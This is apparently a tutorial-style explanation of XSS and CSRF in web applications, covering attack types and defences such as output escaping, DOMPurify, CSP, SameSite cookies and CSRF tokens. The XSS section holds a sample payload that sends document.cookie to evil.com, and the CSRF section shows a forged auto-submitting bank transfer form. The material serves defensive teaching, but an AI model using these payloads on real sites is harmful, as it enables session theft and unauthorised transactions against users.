**XSS (Cross-Site Scripting)** is when an attacker gets **malicious JavaScript to run in your site's pages**, in other users' browsers. **CSRF (Cross-Site Request Forgery)** is when an attacker tricks a logged-in user's browser into **sending an unwanted request to your site**, riding on their cookies. XSS abuses the user's trust in the site; CSRF abuses the site's trust in the user's browser.

## XSS (Cross-Site Scripting)

### Types

- **Stored XSS**: malicious script is saved in the database (e.g. a comment) and served to every visitor.
- **Reflected XSS**: script comes from the URL/request and is echoed back in the response (`/search?q=<script>...`).
- **DOM-based XSS**: client-side JS takes untrusted data (URL hash, `postMessage`) and writes it into the DOM unsafely.

### Example of the vulnerability

```js
// Untrusted input, e.g. from a URL or a user comment
const comment = '<img src=x onerror="fetch(\'https://evil.com?c=\' + document.cookie)">';

// Vulnerable: parses input as HTML, the onerror handler runs
commentsEl.innerHTML = comment;

// Safe: inserted as plain text, nothing executes
commentsEl.textContent = comment;
```

Once script runs, an attacker can steal tokens from `localStorage`, read non-`HttpOnly` cookies, make requests as the user, log keystrokes, or rewrite the page.

### How to prevent XSS

- **Escape/encode output** by context (HTML, attribute, URL, JS). Frameworks like React, Vue and Angular escape by default.
- **Avoid dangerous sinks**: `innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`, `setTimeout(string)`, React's `dangerouslySetInnerHTML`, `v-html`.
- **Sanitize** HTML you must render with a library like **DOMPurify**:

```js
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(userHtml); // strips scripts and event handlers
```

- **Validate URLs**: block `javascript:` links in user-supplied `href`s.
- **Content Security Policy (CSP)** as defense in depth:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'
```

- Mark session cookies **`HttpOnly`** so injected scripts can't read them.
- Consider **Trusted Types** to enforce safe DOM sinks in Chromium browsers.

## CSRF (Cross-Site Request Forgery)

### How it works

1. User logs in to `bank.com`; the browser stores a session cookie.
2. User visits `evil.com`, which contains a hidden auto-submitting form:

```js
// Page on evil.com
// <form action="https://bank.com/transfer" method="POST" id="f">
//   <input name="to" value="attacker"><input name="amount" value="5000">
// </form>
document.getElementById('f').submit();
```

3. The browser sends the request **with the bank's cookie attached**, and the bank thinks the user did it.

The attacker can't read the response, but they don't need to: the side effect (transfer, password change) already happened.

### How to prevent CSRF

- **`SameSite` cookies**: `SameSite=Lax` (default in modern browsers) or `Strict` stops cookies from being sent on cross-site POSTs.

```
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
```

- **Anti-CSRF tokens**: a random, per-session token embedded in forms or sent as a header, verified by the server. Attackers can't read it cross-origin.

```js
await fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content,
  },
  body: JSON.stringify({ to: 'friend', amount: 50 }),
});
```

- **Check `Origin` / `Referer`** (or `Sec-Fetch-Site`) headers on state-changing requests.
- **Never change state on `GET`** requests.
- Use **token-based auth in headers** (`Authorization: Bearer ...`) instead of cookies; the browser doesn't attach it automatically (but then protect the token from XSS).
- Require **re-authentication** for sensitive actions.

## XSS vs CSRF

| | XSS | CSRF |
|---|---|---|
| Attack | Inject and run script in your site | Forge a request from another site |
| Exploits | Site trusting/rendering untrusted input | Browser auto-sending cookies |
| Attacker can read responses? | Yes, full control of the page | No, only triggers actions |
| Main defenses | Output encoding, sanitization, CSP, `HttpOnly` | `SameSite` cookies, CSRF tokens, Origin checks |
| Relationship | XSS can bypass CSRF tokens (script reads them) | CSRF doesn't need XSS |

## Summary

- **XSS** = attacker's code runs on your page; prevent with escaping, avoiding `innerHTML`, sanitizing, and CSP.
- **CSRF** = attacker makes the user's browser send requests; prevent with `SameSite` cookies, CSRF tokens, and Origin checks.
- Fix XSS first: a single XSS hole defeats most CSRF protections.
